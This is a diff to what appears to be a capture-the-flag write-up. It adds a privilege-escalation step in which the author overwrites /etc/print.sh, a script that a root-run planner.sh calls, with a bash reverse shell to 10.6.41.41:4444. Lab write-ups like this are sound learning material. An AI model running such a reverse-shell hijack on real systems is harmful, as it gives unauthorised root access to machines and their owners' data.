@@ -114,6 +114,17 @@ Someone asked what our main ingredient to our spice soup is today. I figured I c
 -rwx------ 1 lennie lennie    25 Nov 12  2020 print.sh
 ```
 
+planner.sh runs two commands:
+
+1). It saves the content of the $LIST variable to /home/lennie/scripts/startup_list.txt.
+
+2). Then it runs the /etc/print.sh script.
+
+I modified /etc/print.sh to run a reverse shell as root when planner.sh is executed, giving me root access. 
+```
+echo '#!/bin/bash
+bash -i >& /dev/tcp/10.6.41.41/4444 0>&1' > /etc/print.sh
+```
 
 
 
